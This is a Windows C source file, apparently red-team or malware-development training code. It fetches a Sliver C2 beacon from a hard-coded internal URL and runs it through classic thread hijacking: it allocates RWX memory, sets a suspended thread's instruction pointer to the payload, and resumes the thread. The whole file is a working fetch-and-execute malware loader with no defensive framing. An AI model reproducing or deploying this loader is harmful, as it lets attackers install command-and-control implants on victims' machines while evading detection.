#include <Windows.h>
#include <stdio.h>
#include <wininet.h>

#pragma comment (lib, "Wininet.lib")

#define PAYLOAD	L"http://10.4.10.20:8080/dev_sliver_beacon.bin"

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL;
	PBYTE		pBytes = NULL,
		pTmpBytes = NULL;



	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {

		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}



	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}

// dummy function to use for the sacrificial thread
VOID DummyFunction() {

	// stupid code
	int		j = rand();
	int		i = j * j;

}

BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PVOID    pAddress = NULL;
	DWORD    dwOldProtection = NULL;
	CONTEXT  ThreadCtx = {
		.ContextFlags = CONTEXT_CONTROL
	};

	// Allocating memory for the payload
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Copying the payload to the allocated memory
	memcpy(pAddress, pPayload, sPayloadSize);

	// Changing the memory protection
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Getting the original thread context
	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Updating the next instruction pointer to be equal to the payload's address 
	ThreadCtx.Rip = pAddress;

	// Updating the new thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int main()
{

	SIZE_T Size = NULL;
	PBYTE Bytes = NULL;

	if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
		return -1;
	}

	printf("[i] Bytes : 0x%p \n", Bytes);
	printf("[i] Size  : %ld \n", Size);

	HANDLE hThread = NULL;
	DWORD		dwThreadId = NULL;

	// Creating sacrificial thread in suspended state 
	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, &dwThreadId);
	if (hThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[i] Hijacking Thread Of Id : %d ... ", dwThreadId);
	// Hijacking the sacrificial thread created
	if (!RunViaClassicThreadHijacking(hThread, Bytes, Size)) {
		return -1;
	}
	printf("[+] DONE \n");

	printf("[#] Press <Enter> To Run The Payload ... ");
	getchar();


	// Resuming suspended thread, so that it runs our shellcode
	ResumeThread(hThread);

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	printf("[#] Press <Enter> To Quit ... ");
	getchar();


	return 0;
}